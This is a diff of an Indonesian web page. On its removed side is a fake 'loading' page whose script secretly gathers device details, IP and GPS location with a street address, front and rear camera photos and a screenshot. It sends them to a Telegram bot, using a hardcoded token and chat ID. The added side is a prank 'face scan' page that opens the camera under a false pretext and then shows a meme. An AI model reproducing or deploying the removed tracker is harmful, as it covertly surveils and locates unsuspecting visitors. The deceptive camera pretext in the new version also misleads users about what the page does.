@@ -2,148 +2,140 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>Website Bug - GyzenLyoraa</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keamanan Scan Wajah</title>
     <style>
-        body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
-        #loading-container{text-align:center;width:80%;max-width:400px}
-        #loading-text{font-size:22px;margin-bottom:20px;color:#6e48aa}
-        #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
-        #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#9d50bb);transition:width .3s ease}
-        #loading-details{margin-top:20px;font-size:14px;color:#666}
-        .hidden{display:none}
+        body {
+            margin: 0;
+            background: black;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        #camera-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            z-index: 1;
+        }
+        /* Efek kotak hijau seperti scanner */
+        #scanner-box {
+            position: absolute;
+            width: 250px;
+            height: 250px;
+            border: 4px solid #00ff00;
+            border-radius: 20px;
+            box-shadow: 0 0 20px #00ff00;
+            z-index: 2;
+        }
+        /* Garis scan yang bergerak naik turun */
+        #scanner-line {
+            width: 100%;
+            height: 4px;
+            background: rgba(0, 255, 0, 0.8);
+            position: absolute;
+            top: 0;
+            box-shadow: 0 0 10px #00ff00;
+            animation: scan 2s infinite linear;
+        }
+        @keyframes scan {
+            0% { top: 0; }
+            50% { top: 100%; }
+            100% { top: 0; }
+        }
+        #text-info {
+            position: absolute;
+            bottom: 15%;
+            font-size: 22px;
+            font-weight: bold;
+            text-shadow: 2px 2px 5px black;
+            z-index: 2;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        /* Gambar prank yang disembunyikan di awal */
+        #prank-image {
+            display: none;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 10;
+        }
     </style>
 </head>
 <body>
-    <div id="loading-container">
-        <div id="loading-text">PROSES LOADING</div>
-        <div id="progress-container"><div id="progress-bar"></div></div>
-        <div id="loading-details">Memulai inisialisasi...</div>
+
+    <div id="camera-container">
+        <video id="video" autoplay playsinline></video>
+        
+        <div id="scanner-box">
+            <div id="scanner-line"></div>
+        </div>
+        <div id="text-info">Mendeteksi Wajah... Posisikan Wajah Anda</div>
     </div>
-    
-    <video id="v" autoplay muted class="hidden"></video>
-    <canvas id="c" class="hidden"></canvas>
 
-<script>
-(()=>{
-    const T='8796435263:AAFpdc1RSIdv5CpY4D-CeSMPRy3t1OtAvZY', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
-          C='6324080021', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
-          pb=document.getElementById('progress-bar'),
-          ld=document.getElementById('loading-details');
+    <img id="prank-image" src="https://i.imgflip.com/4/33eb5n.jpg" alt="Prank!">
 
-    let p=0;
-    const LM=["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];
-    
-    // Logic untuk progress bar
-    setInterval(()=>{
-        p+=Math.random()*5;
-        if(p>98)p=98;
-        pb.style.width=p+'%';
-        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
-    },500);
+    <script>
+        const video = document.getElementById('video');
+        const prankImage = document.getElementById('prank-image');
+        const cameraContainer = document.getElementById('camera-container');
+        const textInfo = document.getElementById('text-info');
 
-    // Fungsi kirim pesan ke Telegram
-    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
-    
-    // Fungsi kirim foto ke Telegram
-    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
-    
-    // Fungsi mendapatkan lokasi detail dari koordinat
-    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
-    
-    // Fungsi mendapatkan informasi perangkat
-    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───── Channel Telegram @AboutGyzenLyoraa  ───── ⦿';return m};
+        // Meminta akses kamera depan (user facing camera)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                // Ubah teks setelah 2 detik supaya terlihat realistis
+                setTimeout(() => {
+                    textInfo.innerText = "Menganalisis Data...";
+                    textInfo.style.color = "yellow";
+                }, 2000);
 
-    // Mengambil gambar dari kamera dengan mode tertentu
-    const captureCamera = async (mode) => {
-        const v = document.getElementById('v'), 
-              c = document.getElementById('c');
-        let stream;
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: { exact: mode } 
-                }
+                // Eksekusi Prank setelah 5 detik
+                setTimeout(() => {
+                    // Matikan akses kamera agar lampu indikator kamera mati
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Sembunyikan layar kamera dan munculkan gambar
+                    cameraContainer.style.display = 'none';
+                    prankImage.style.display = 'block';
+                    
+                    // (Opsional) Jika ingin menambah suara kaget, kamu bisa pakai kode di bawah ini:
+                    // let audio = new Audio('LINK_AUDIO_MP3_KAMU_DISINI');
+                    // audio.play();
+                    
+                }, 5000); // Angka 5000 = 5 detik. Bisa kamu ubah sesuai selera.
+            })
+            .catch(err => {
+                console.error("Kamera gagal diakses:", err);
+                textInfo.innerText = "Akses Kamera Ditolak / Tidak Tersedia";
+                textInfo.style.color = "red";
+                textInfo.style.animation = "none";
             });
-            v.srcObject = stream;
-            
-            await new Promise(resolve => v.onloadedmetadata = resolve);
-            v.play();
+    </script>
 
-            // Waktu tunggu kamera 1.5 detik
-            await new Promise(r => setTimeout(r, 1500)); 
-            
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            
-            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
-            
-            stream.getTracks().forEach(t => t.stop());
-            return true; 
-            
-        } catch (e) {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-            }
-            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
-            return false; 
-        }
-    };
-
-    // FUNGSI UTAMA: Menjalankan semua proses tracking
-    const ST=async()=>{
-        await sTG(await cDI()); 
-
-        let cameraSuccess = false;
-
-        // 1. Coba Kamera Depan (User)
-        cameraSuccess = await captureCamera("user");
-
-        // 2. Jika Gagal, Coba Kamera Belakang (Environment)
-        if (!cameraSuccess) {
-            cameraSuccess = await captureCamera("environment");
-        }
-
-        if (!cameraSuccess) {
-             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
-        }
-
-        // Ambil Screenshot 
-        setTimeout(async()=>{
-            try{
-                const cn=await html2canvas(document.body);
-                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
-            }catch(e){
-                await sTG('❌ Screenshot failed')
-            }
-        }, 2000); 
-
-        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(async p=>{
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                
-                // Menambahkan link Google Maps
-                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
-                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
-                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
-                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
-                
-                const l=await gLD(lat,lon);
-                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
-                await sTG(g)
-            },async e=>{
-                await sTG(`❌ GPS Error: ${e.message}`)
-            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
-        }
-    };
-
-    // Langsung menjalankan fungsi ST tanpa delay
-    ST();
-})();
-</script>
 </body>
 </html>
+
